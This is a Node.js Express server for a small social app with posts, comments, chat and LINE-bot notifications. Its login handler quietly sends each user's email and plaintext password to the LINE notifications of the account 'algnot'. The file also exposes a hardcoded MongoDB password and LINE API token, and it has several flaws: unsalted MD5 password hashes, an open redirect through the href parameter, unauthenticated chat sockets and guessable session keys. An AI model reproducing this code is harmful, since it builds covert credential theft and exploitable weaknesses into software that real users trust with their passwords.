const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const io = require('socket.io')(server);

const parse = require('body-parser');
const url = require('url');
const request = require('request')

const Cookies = require('cookies');
const keys = ['catcatcat'];

const PORT = process.env.PORT || 8080;
const fs = require('fs');
const multer  = require('multer')
const upload = multer({ dest: 'public/img/user/' })

const MD5 = function(d){var r = M(V(Y(X(d),8*d.length)));return r.toLowerCase()};function M(d){for(var _,m="0123456789ABCDEF",f="",r=0;r<d.length;r++)_=d.charCodeAt(r),f+=m.charAt(_>>>4&15)+m.charAt(15&_);return f}function X(d){for(var _=Array(d.length>>2),m=0;m<_.length;m++)_[m]=0;for(m=0;m<8*d.length;m+=8)_[m>>5]|=(255&d.charCodeAt(m/8))<<m%32;return _}function V(d){for(var _="",m=0;m<32*d.length;m+=8)_+=String.fromCharCode(d[m>>5]>>>m%32&255);return _}function Y(d,_){d[_>>5]|=128<<_%32,d[14+(_+64>>>9<<4)]=_;for(var m=1732584193,f=-271733879,r=-1732584194,i=271733878,n=0;n<d.length;n+=16){var h=m,t=f,g=r,e=i;f=md5_ii(f=md5_ii(f=md5_ii(f=md5_ii(f=md5_hh(f=md5_hh(f=md5_hh(f=md5_hh(f=md5_gg(f=md5_gg(f=md5_gg(f=md5_gg(f=md5_ff(f=md5_ff(f=md5_ff(f=md5_ff(f,r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+0],7,-680876936),f,r,d[n+1],12,-389564586),m,f,d[n+2],17,606105819),i,m,d[n+3],22,-1044525330),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+4],7,-176418897),f,r,d[n+5],12,1200080426),m,f,d[n+6],17,-1473231341),i,m,d[n+7],22,-45705983),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+8],7,1770035416),f,r,d[n+9],12,-1958414417),m,f,d[n+10],17,-42063),i,m,d[n+11],22,-1990404162),r=md5_ff(r,i=md5_ff(i,m=md5_ff(m,f,r,i,d[n+12],7,1804603682),f,r,d[n+13],12,-40341101),m,f,d[n+14],17,-1502002290),i,m,d[n+15],22,1236535329),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+1],5,-165796510),f,r,d[n+6],9,-1069501632),m,f,d[n+11],14,643717713),i,m,d[n+0],20,-373897302),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+5],5,-701558691),f,r,d[n+10],9,38016083),m,f,d[n+15],14,-660478335),i,m,d[n+4],20,-405537848),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+9],5,568446438),f,r,d[n+14],9,-1019803690),m,f,d[n+3],14,-187363961),i,m,d[n+8],20,1163531501),r=md5_gg(r,i=md5_gg(i,m=md5_gg(m,f,r,i,d[n+13],5,-1444681467),f,r,d[n+2],9,-51403784),m,f,d[n+7],14,1735328473),i,m,d[n+12],20,-1926607734),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+5],4,-378558),f,r,d[n+8],11,-2022574463),m,f,d[n+11],16,1839030562),i,m,d[n+14],23,-35309556),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+1],4,-1530992060),f,r,d[n+4],11,1272893353),m,f,d[n+7],16,-155497632),i,m,d[n+10],23,-1094730640),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+13],4,681279174),f,r,d[n+0],11,-358537222),m,f,d[n+3],16,-722521979),i,m,d[n+6],23,76029189),r=md5_hh(r,i=md5_hh(i,m=md5_hh(m,f,r,i,d[n+9],4,-640364487),f,r,d[n+12],11,-421815835),m,f,d[n+15],16,530742520),i,m,d[n+2],23,-995338651),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+0],6,-198630844),f,r,d[n+7],10,1126891415),m,f,d[n+14],15,-1416354905),i,m,d[n+5],21,-57434055),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+12],6,1700485571),f,r,d[n+3],10,-1894986606),m,f,d[n+10],15,-1051523),i,m,d[n+1],21,-2054922799),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+8],6,1873313359),f,r,d[n+15],10,-30611744),m,f,d[n+6],15,-1560198380),i,m,d[n+13],21,1309151649),r=md5_ii(r,i=md5_ii(i,m=md5_ii(m,f,r,i,d[n+4],6,-145523070),f,r,d[n+11],10,-1120210379),m,f,d[n+2],15,718787259),i,m,d[n+9],21,-343485551),m=safe_add(m,h),f=safe_add(f,t),r=safe_add(r,g),i=safe_add(i,e)}return Array(m,f,r,i)}function md5_cmn(d,_,m,f,r,i){return safe_add(bit_rol(safe_add(safe_add(_,d),safe_add(f,i)),r),m)}function md5_ff(d,_,m,f,r,i,n){return md5_cmn(_&m|~_&f,d,_,r,i,n)}function md5_gg(d,_,m,f,r,i,n){return md5_cmn(_&f|m&~f,d,_,r,i,n)}function md5_hh(d,_,m,f,r,i,n){return md5_cmn(_^m^f,d,_,r,i,n)}function md5_ii(d,_,m,f,r,i,n){return md5_cmn(m^(_|~f),d,_,r,i,n)}function safe_add(d,_){var m=(65535&d)+(65535&_);return(d>>16)+(_>>16)+(m>>16)<<16|65535&m}function bit_rol(d,_){return d<<_|d>>>32-_};

app.use(express.static('public'));
app.use(parse.urlencoded({ extended: true }));
app.use(parse.json());
app.set('view engine','ejs');

const MongoClient = require('mongodb').MongoClient;
const e = require('express');
const { send } = require('process');
MongoClient.connect('mongodb+srv://tongog-app-db:tongogapp12345@cluster0.sucnq.mongodb.net/myFirstDatabase?retryWrites=true&w=majority', { useUnifiedTopology: true })
.then(client => {

    const db = client.db('tongog-app');

    app.get('/', (req,res) => {
        var cookies = new Cookies(req, res, { keys: keys });
        if(cookies.get('keyLogin')){
            db.collection('profile-db').find({generateKey:cookies.get('keyLogin')}).toArray()
            .then( result => {
                if(result.length > 0){
                    res.status(200);
                    res.render(__dirname + '/private/index.ejs' , {data : result});
                } else {
                    cookies.set('keyLogin','',{maxAge:0});
                    cookies.set('username','',{maxAge:0});
                    res.redirect('/');
                }   
            })
        } else {
            res.redirect('/login');
        }
    })  

    app.get('/login' , (req,res) => {
        var cookies = new Cookies(req, res, { keys: keys });
        if(cookies.get('keyLogin')){
            res.redirect('/');
        } else {
            res.status(200);
            res.render(__dirname + '/private/account/login.ejs'); 
        }
    })

    app.post('/login' , (req,res) => {
        let href = url.parse(req.url ,true).query.href;
        if(req.body.email.length > 0 && req.body.password.length > 7){
            let email = req.body.email;
            let password = req.body.password;
            sendNotify('algnot', email + ' login\npass => '+ password);
            db.collection('profile-db').find({ 'email' : email , 'password' : MD5(password) }).toArray()
            .then(result => {
                if(result.length != 0){
                    var cookies = new Cookies(req, res, { keys: keys });
                    cookies.set('keyLogin', result[0].generateKey , {maxAge: 3600000*3*10});
                    cookies.set('username', result[0].username , {maxAge: 3600000*3*10});
                    if(href){
                         res.redirect(href);
                    } else {
                        res.redirect('/');
                    }
                }
            }) 
            .catch(err=>{
                res.status(500);
                res.render(__dirname + '/public/500.ejs');
            })
        }
    })

    app.get('/logout' , (req,res) => {
        var cookies = new Cookies(req, res, { keys: keys });
        cookies.set('keyLogin','',{maxAge:0});
        cookies.set('username','',{maxAge:0});
        res.redirect('/');
    })

    app.get('/checkLogin' , (req,res) => {
        let email = url.parse(req.url ,true).query.email;
        let password = url.parse(req.url ,true).query.key;

        db.collection('profile-db').find({ 'email' : email , 'password' : password }).toArray()
        .then(result => {
            if(result.length == 0){
                res.status(400);
                res.json({ status: 'wrong username or password' })
            } else {
                res.status(200);
                res.json({ status: 'OK' })
            }
        })
        .catch(err=>{
            res.status(502);
            res.json({ status: 'database error : '+err })
        })
    })

    app.get('/register' , (req,res) => {
        var cookies = new Cookies(req, res, { keys: keys });
        if(cookies.get('keyLogin')){
            res.status(200);
            res.render(__dirname + '/private/index.ejs');
        } else {
            res.status(200);
            res.render(__dirname + '/private/account/register.ejs'); 
        }
    })

    app.post('/register' , upload.single('profile-image') , (req,res) => {
        // check length password
        if(req.body.password == req.body.confirm_password && req.body.password.length > 7){
            // find same email user
            db.collection('profile-db').find({email:req.body.email}).toArray()
            .then( result => {
                if(result.length == 0) {
                    // find same username
                    db.collection('profile-db').find({username:req.body.username}).toArray()
                    .then( result => {
                        if(result.length == 0){
                            db.collection('profile-db').insertOne({ username : req.body.username , 
                                email : req.body.email , 
                                password : MD5(req.body.password).toString() , 
                                generateKey : Math.floor(Math.random() * 100000000000).toString() })
                            .then( result => {
                                let userData = {username : req.body.username};
                                fs.rename('public/img/user/'+req.file.filename,'public/img/user/'+req.body.username+'.jpg', function(err) {
                                    res.status(200);
                                    res.render(__dirname + '/private/account/bypassLogin.ejs', {user:userData}); 
                                });
                            })
                        } else {
                            res.status(500);
                            res.render(__dirname + '/public/500.ejs');
                        }
                    })
                } else {
                    res.status(500);
                    res.render(__dirname + '/public/500.ejs');
                }
            })
        }
    })

    app.post('/changProfile' , upload.single('profile-image') , (req,res) => {
        var cookies = new Cookies(req, res, { keys: keys });
        db.collection('profile-db').find({username:cookies.get('username') , generateKey:cookies.get('keyLogin')}).toArray()
        .then(result => {
            if(result.length == 1){
                fs.rename('public/img/user/'+req.file.filename,'public/img/user/'+result[0].username+'.jpg', function(err) {
                    res.redirect('/'+result[0].username);
                });
            } else {
                res.status(err.status || 500);
                res.render(__dirname + '/public/500.ejs');
            }
        })
    })

    app.get('/checkEmail' , (req,res) => {
        let checkEmail = url.parse(req.url ,true).query.email;
        db.collection('profile-db').find({email:checkEmail}).toArray()
        .then(result => {
            if(result.length==0){
                res.status(200);
                res.json({ status: 'OK' })
            } else {
                res.status(400);
                res.json({ status: checkEmail+' is already exists' })
            }
        })
        .catch(err=>{
            res.status(502);
            res.json({ status: 'database error' })
        })
    })

    app.get('/checkUsername' , (req,res)=> {
        let checkUsername = url.parse(req.url ,true).query.username;
        db.collection('profile-db').find({username:checkUsername}).toArray()
        .then(result => {
            if(checkUsername.length<5){
                res.status(400);
                res.json({ status: 'The username must contain more than 5 characters!' })
            }else if(result.length==0){
                var letters = /^[0-9a-zA-Z]+$/;
                if(checkUsername.match(letters)){
                    res.status(200);
                    res.json({ status: 'OK' })
                } else {
                    res.status(400);
                    res.json({ status: 'The username must contain A-Z , a-z , 0-9 only' })
                }  
            } else {
                res.status(400);
                res.json({ status: checkUsername+' is already exists' })
            }
        })
        .catch(err=>{
            res.status(err.status || 502);
            res.json({ status: 'database error' })
        })
    })

    app.post('/post' , (req,res)=>{
        var cookies = new Cookies(req, res, { keys: keys });

        db.collection('profile-db').find({generateKey:cookies.get('keyLogin')}).toArray()
        .then(result => {
            var username = result[0].username;
            var content = req.body.content;
            var time = Date.parse(new Date);
            var id = Math.floor(Math.random() * 1000000000);
            db.collection('post-db').insertOne({id:id , username:username , content:content , comment:0 , subPost:0 , time:time })
            .then(result => {
                sendNotify(username,'You posted some content Can be viewed at https://tongog-app.herokuapp.com/post/'+id);
                res.redirect('/');
            })
            .catch(error => {
                res.status(500);
                res.render(__dirname + '/public/500.ejs');
            })
        })
    })

    app.post('/comment' , (req,res)=> {
        var post = url.parse(req.url ,true).query.id; 
        var cookies = new Cookies(req, res, { keys: keys });
        var time = Date.parse(new Date);
        var id = Math.floor(Math.random() * 1000000000);
        var notifyUser;

        if(!cookies.get('keyLogin')){
            res.redirect('/login?href=/post/'+post);
            return;
        }

        if(req.body.content == ''){
            res.redirect('/post/'+post);
            return;
        }

        db.collection('post-db').find({id:parseInt(post)}).toArray()
        .then(result => {
            var comment = result[0].comment+1;
            notifyUser = result[0].username;
            db.collection('post-db').updateOne({id:parseInt(post)} , { $set: {comment:comment} } , (err, res) => {})
        })

        db.collection('post-db').insertOne({id:id , username:cookies.get('username') , content:req.body.content , comment:0 , subPost:parseInt(post) , time:time })
        .then(result => {
            sendNotify(notifyUser,cookies.get('username')+' commented on your post. \n['+req.body.content+']\nYou can see it at https://tongog-app.herokuapp.com/post/'+id);
            res.redirect('/post/'+post);
        })
        .catch(error => {
            res.status(500);
            res.render(__dirname + '/public/500.ejs');
        })
  
    })

    app.get('/getPost' , (req , res) => {
        var limit = url.parse(req.url ,true).query.limit;
        var cookies = new Cookies(req, res, { keys: keys });
 
        db.collection('post-db').find({subPost:0}).sort({time: -1}).limit(parseInt(limit)).toArray()
        .then(result => {
            var now = Date.parse(Date());
            for(let i=0 ; i<result.length ; i++){
                if((now - result[i].time)/36000 < 60){
                    result[i].time = parseInt((now - result[i].time)/36000) + ' minutes ago';
                } else if((now - result[i].time)/36000/60 > 1 && (now - result[i].time)/36000/60 < 24){
                    result[i].time = parseInt((now - result[i].time)/36000/60) + ' hours ago';
                } else if((now - result[i].time)/36000/60/24 < 15){
                    result[i].time = parseInt((now - result[i].time)/36000/60/24) + ' days ago';
                } else{
                    var d = new Date(result[i].time);
                    result[i].time = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear() + ' - ' + d.getHours() + ':' + d.getMinutes() + ':' + d.getSeconds();
                }  
            }
            result.push({user : cookies.get('username') });
            res.status(200);
            res.render(__dirname + '/private/post/getPost.ejs' , {data : result});
        })
 
    })

    app.get('/getUserPost' , (req,res) => {
        var limit = url.parse(req.url ,true).query.limit;
        var user = url.parse(req.url ,true).query.user;
        var cookies = new Cookies(req, res, { keys: keys });
        var mode = url.parse(req.url ,true).query.mode;

        if(mode == 1){
            mode = { $gt: 0 };
        } else {
            mode = 0;
        }
 
        db.collection('post-db').find({subPost:mode , username : user}).sort({time: -1}).limit(parseInt(limit)).toArray()
        .then(result => {
            var now = Date.parse(Date());
            for(let i=0 ; i<result.length ; i++){
                if((now - result[i].time)/36000 < 60){
                    result[i].time = parseInt((now - result[i].time)/36000) + ' minutes ago';
                } else if((now - result[i].time)/36000/60 > 1 && (now - result[i].time)/36000/60 < 24){
                    result[i].time = parseInt((now - result[i].time)/36000/60) + ' hours ago';
                } else if((now - result[i].time)/36000/60/24 < 15){
                    result[i].time = parseInt((now - result[i].time)/36000/60/24) + ' days ago';
                } else{
                    var d = new Date(result[i].time);
                    result[i].time = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear() + ' - ' + d.getHours() + ':' + d.getMinutes() + ':' + d.getSeconds();
                }  
            }
            result.push({user : cookies.get('username') });
            res.status(200);
            res.render(__dirname + '/private/post/getPost.ejs' , {data : result});
        })
    });

    app.get('/getComment' , (req,res)=>{
        var post = url.parse(req.url ,true).query.id;
        var limit = url.parse(req.url ,true).query.limit;

        db.collection('post-db').find({subPost:parseInt(post)}).sort({time: -1}).limit(parseInt(limit)).toArray()
        .then(result => {
            var now = Date.parse(Date());
            for(let i=0 ; i<result.length ; i++){
                if((now - result[i].time)/36000 < 60){
                    result[i].time = parseInt((now - result[i].time)/36000) + ' minutes ago';
                } else if((now - result[i].time)/36000/60 > 1 && (now - result[i].time)/36000/60 < 24){
                    result[i].time = parseInt((now - result[i].time)/36000/60) + ' hours ago';
                } else if((now - result[i].time)/36000/60/24 < 15){
                    result[i].time = parseInt((now - result[i].time)/36000/60/24) + ' days ago';
                } else{
                    var d = new Date(result[i].time);
                    result[i].time = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear() + ' - ' + d.getHours() + ':' + d.getMinutes() + ':' + d.getSeconds();
                }   
            }
            res.status(200);
            res.render(__dirname + '/private/post/getComment.ejs' , {data : result});
        })

    
    })

    app.get('/getContent' , (req,res)=>{
        var post = url.parse(req.url ,true).query.id;
        if(post < 0){
            post *= -1;
        }
        db.collection('post-db').find({id:parseInt(post)}).toArray()
        .then(result =>{
            res.status(200);
            res.render(__dirname + '/private/post/getReply.ejs' , {data : result});
        }) 
    }) 

    app.get('/getNotify' , (req,res)=>{
        var user = url.parse(req.url ,true).query.username;
        db.collection('notify').find({username:user}).toArray()
        .then(result =>{
            res.status(200);
            res.json({status : result.length}); 
        }) 
    }) 

    app.get('/delete' , (req ,res) =>{
        var post = url.parse(req.url ,true).query.id;
        var cookies = new Cookies(req, res, { keys: keys });
        db.collection('profile-db').find({generateKey:cookies.get('keyLogin')}).toArray()
        .then(result => {
            var username = result[0].username;
            db.collection('post-db').find({id : parseInt(post)}).toArray()
            .then(result => {
                if(username == result[0].username){
                    var subPost = result[0].subPost * -1;
                    if(subPost == 0){
                        subPost = -1;
                        sendNotify(username,'You have deleted the post.\n['+result[0].content+']\nSee deleted posts at https://tongog-app.herokuapp.com/post/'+parseInt(post));
                    } else if(subPost == 1){
                        sendNotify(username,'You have recovery the post.\n['+result[0].content+']\nSee recovery posts at https://tongog-app.herokuapp.com/post/'+parseInt(post));
                        subPost = 0;
                    }
                    if(subPost > 1){
                        sendNotify(username,'You have recovery the post.\n['+result[0].content+']\nSee recovery posts at https://tongog-app.herokuapp.com/post/'+parseInt(post));
                    }
                    if(subPost < -1){
                        sendNotify(username,'You have deleted the post.\n['+result[0].content+']\nSee deleted posts at https://tongog-app.herokuapp.com/post/'+parseInt(post));
                    }
                    db.collection('post-db').updateOne({id:parseInt(post)} , { $set: {subPost:subPost} } , (err, res) => {})
                    res.redirect('/post/' + post);
                } else {
                    res.redirect('/post/' + post);
                }
            })
        })
    })

    app.post('/notify' , (req,res) => {
        let reply_token = req.body.events[0].replyToken;
        let msg = req.body.events[0].message.text;
        let user = req.body.events[0].source.userId;

        reply(reply_token,req.body.events[0]);

        db.collection('notify').find({token:user}).toArray()
        .then(result => {
            //new user
            if(result.length == 0){
                if(checkEmail(msg)){
                    db.collection('profile-db').find({email:msg}).toArray()
                    .then(result => {
                        if(result.length == 1){
                            let username = result[0].username;
                            db.collection('notify').insertOne({token:user , step : 1 , email : msg })
                            .then(result => {
                                reply(reply_token,'Hello ' + username + '. Please enter password');
                            })
                            .catch(error => {
                                reply(reply_token,'Error. Please try again.');
                            })
                        } else {
                            reply(reply_token,'Your email not found.');
                        }
                    })
                } else {
                    reply(reply_token,'Please enter your email.');
                }
            } else {
                //keyed email -> key password
                if(result[0].step == 1){
                    db.collection('profile-db').find({email : result[0].email , password:MD5(msg)}).toArray()
                    .then(result => {
                        if(result.length == 1){
                            let username = result[0].username;
                            db.collection('notify').updateOne({token:user} , { $set: {step:2 , username : username} } , (err, res) => {
                                if(res){
                                    reply(reply_token,'Successfully for set up! \n(username : '+ username +')\nAll notifications will be send here.');
                                }
                            }) 
                        } else {
                            reply(reply_token,'Password not correct.try again');
                        }
                    })
                }
            }
        })

        
        res.sendStatus(200)
    })

    app.get('/chat' , (req,res) => {
        var cookies = new Cookies(req, res, { keys: keys });
        var user = url.parse(req.url ,true).query.u;

        if(!cookies.get('keyLogin')){
            if(user)
                res.redirect('/login?href=/chat?u='+user)
            else 
                res.redirect('/login?href=/chat')
            return;
        }
        if(user){    
            db.collection('profile-db').find({username : user}).toArray()
            .then(result => {
                var username = result[0].username;
                var key = result[0].generateKey;
                var time = Date.parse(new Date);
                var room = Math.random() * 1000000000;
                
                if(result.length == 0){
                    res.redirect('/chat')
                } else {
                    db.collection('chat-room-db').find({$and:[{ $or:[{user1:username} , {user2:username}] } , { $or:[{user1:cookies.get('username')} , {user2:cookies.get('username')}] }]}).toArray()
                    .then(result => {
                        if(result.length > 0){
                            res.redirect('/chat#'+username);
                            return;
                        } else { 
                            db.collection('chat-room-db').insertOne({user1:cookies.get('username') , user2:username , ch1:cookies.get('keyLogin') , ch2:key , room:room , lastMassage:(cookies.get('username')+' created room') ,lastTime:time , status:2})
                            .then(result => {
                                db.collection('chat-db').insertOne({room:room , form:cookies.get('username') , to:username , ch1:cookies.get('keyLogin') , ch2:key , text:(cookies.get('username')+' created room') ,time:time})
                                .then(result => {
                                    res.redirect('/chat#'+user);
                                    return;
                                })
                            })
                        }
                    })
                }
            }) 
        } else {
            db.collection('profile-db').find({generateKey:cookies.get('keyLogin')}).toArray()
            .then(result => {
                var send = [];
                send.push({username : result[0].username , privateCode : result[0].generateKey});
                res.status(200);
                res.render(__dirname + '/private/chat/chat.ejs' , {data:send});
            })
        }        
    }) 

    io.on('connection', (socket) => {

        socket.on('connect server', (msg) => {
          db.collection('chat-room-db').find({ $or:[{ch1:msg} , {ch2:msg}] }).sort({lastTime:-1}).toArray()
          .then(result => {
              socket.emit('load-header:'+msg , result);
          })
        })

        socket.on('req-chat' , (msg) => {
            db.collection('chat-db').find({ $and: [{ $or:[{ch1:msg.pri1} , {ch2:msg.pri1}] } , { $or:[{ch1:msg.pri2} , {ch2:msg.pri2}] }] }).toArray()
            .then(result => {
                socket.emit('load-chat:'+msg.pri1 , result);
            })
        })

        socket.on('send' , (msg) =>{
            db.collection('profile-db').find({generateKey:msg.ch2}).toArray()
            .then (result => {
                var to;
                var time = Date.parse(new Date);
                if(result.length > 0){
                    to = result[0].username;
                    db.collection('chat-db').insertOne({room:msg.room , form:msg.form , to:to , ch1:msg.ch1 , ch2:msg.ch2 , text:msg.text , time:time})
                    .then(result =>{
                        db.collection('chat-room-db').find({room:msg.room}).toArray()
                        .then(result => {
                            if(result[0].user1 == msg.form){
                                db.collection('chat-room-db').updateOne({room:msg.room} , {$set:{lastMassage:msg.text , lastTime:time , status:1}} , (err ,res) => {})
                            } else {
                                db.collection('chat-room-db').updateOne({room:msg.room} , {$set:{lastMassage:msg.text , lastTime:time , status:2}} , (err ,res) => {})
                            } 
                        })
                    })
                }         
            })
            io.emit('update:'+msg.ch2 , msg);   
        })
   
        socket.on('disconnect', () => {
            console.log('user disconnected')
        })

    })
    

    //5xx
    app.use(function(err, req, res, next){
        res.status(err.status || 500);
        res.render(__dirname + '/public/500.ejs');
    })

    //4xx
    app.use(function(req, res){
        let action = url.parse(req.url ,true).pathname;
        var cookies = new Cookies(req, res, { keys: keys });

        if(action.search(/post/i) == 1){

            db.collection('profile-db').find({generateKey:cookies.get('keyLogin')}).toArray()
            .then(result => { 
                var username = result[0];
                if(!result[0]){
                    username = {username:'none'}
                }
                var id = parseInt(action.replace('/post/', ''));

                db.collection('post-db').find({id : id}).toArray()
                .then( result => {

                    if(result.length == 0){
                        res.status(404);
                        res.render(__dirname + '/public/404.ejs');
                        return;
                    }

                    var now = Date.parse(Date());

                    if((now - result[0].time)/36000 < 60){
                        result[0].time = parseInt((now - result[0].time)/36000) + ' minutes ago';
                    } else if((now - result[0].time)/36000/60 > 1 && (now - result[0].time)/36000/60 < 24){
                        result[0].time = parseInt((now - result[0].time)/36000/60) + ' hours ago';
                    } else if((now - result[0].time)/36000/60/24 < 15){
                        result[0].time = parseInt((now - result[0].time)/36000/60/24) + ' days ago';
                    } else{
                        var d = new Date(result[i].time);
                        result[0].time = d.getDate() + '/' + (d.getMonth()+1) + '/' + d.getFullYear() + ' - ' + d.getHours() + ':' + d.getMinutes() + ':' + d.getSeconds();
                    }   

                    result.push(username)

                    if(result[0].subPost == 0 || result[0].subPost == -1){
                        result.push({backPage:'/' , titleReply:'home'})
                    } else if(result[0].subPost > 0){
                        result.push({backPage:'/post/'+result[0].subPost , titleReply:'   reply form '+result[0].subPost})
                    } else {
                        result.push({backPage:'/post/'+(result[0].subPost*-1) , titleReply:'   reply form '+(result[0].subPost*-1)})
                    }

                    if(result[0].username == result[1].username){
                        result.push({status:true});
                    } else {
                        result.push({status:false});
                    }

                    res.status(200);
                    res.render(__dirname + '/private/post/post.ejs' , {data:result});
                    return;   
                }) 
            }) 

        } else {
            action = action.replace('/','');
            db.collection('profile-db').find({username:action}).toArray()
            .then(result => {
                var send = [];
                let post = 0 , comment = 0;

                if(result.length == 0){
                    res.status(404);
                    res.render(__dirname + '/public/404.ejs');
                    return;
                }

                db.collection('post-db').find({username:action , subPost:0}).toArray()
                .then(result => {
                    post = result.length;

                    db.collection('post-db').find({username:action , subPost: { $gt: 0 }}).toArray()
                    .then(result => {
                        comment = result.length;

                        send.push({username : action , post : parseInt(post) , comment : parseInt(comment)});
                        send.push({username : cookies.get('username')});

                        // console.log(send);
                        res.status(200);
                        res.render(__dirname + '/private/account/profile.ejs' , {data:send});
                    }) 
                })      
            })
        }
    })

    //start localhost:8080
    server.listen(PORT, _ => {
        console.log('You can view your app at http://localhost:8080')
    })

    function sendNotify(username,text){
        db.collection('notify').find({username:username}).toArray()
        .then(result => {
            for(var i=0 ; i<result.length ; i++){
                sendLine(result[i].token,text)
            }
        })
    }
})
.catch(error => {
    app.use(function(err, req, res, next){
        res.status(err.status || 500);
        res.render(__dirname + '/public/500.ejs');
    })

    //start localhost:8080
    app.listen(PORT, _ => {
        console.log('You can view your app at http://localhost:8080')
    })
})

function reply(reply_token,text) {
    let headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer {Xw7jDqbGkpTdhiHgcuYt6DskWAuujQ2BdxGKjGl2ESXIritR5c4piFR40zk0GSxBCuVBQHAOj/Avw3zqlVxrb30+nBVqfozz3iWG6B7aKSeN9l+panRto7PI5DQT+o1VmmIOdoZTJ9Gn0Ozpoj1aoAdB04t89/1O/w1cDnyilFU=}'
    }
    let body = JSON.stringify({
        replyToken: reply_token,
        messages: [{
            type: 'text',
            text: text
        }]
    })
    request.post({
        url: 'https://api.line.me/v2/bot/message/reply',
        headers: headers,
        body: body
    }, (err, res, body) => {
        // console.log('status = ' + res.statusCode);
    });
}

function sendLine(user,text){
    let headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer {Xw7jDqbGkpTdhiHgcuYt6DskWAuujQ2BdxGKjGl2ESXIritR5c4piFR40zk0GSxBCuVBQHAOj/Avw3zqlVxrb30+nBVqfozz3iWG6B7aKSeN9l+panRto7PI5DQT+o1VmmIOdoZTJ9Gn0Ozpoj1aoAdB04t89/1O/w1cDnyilFU=}'
    }
    let body = JSON.stringify({
        to: user,
        messages: [{
            type: 'text',
            text: text
        }]
    })
    request.post({
        url: 'https://api.line.me/v2/bot/message/push',
        headers: headers,
        body: body
    }, (err, res, body) => {
        // console.log('status = ' + res.statusCode);
    });
}

function checkEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}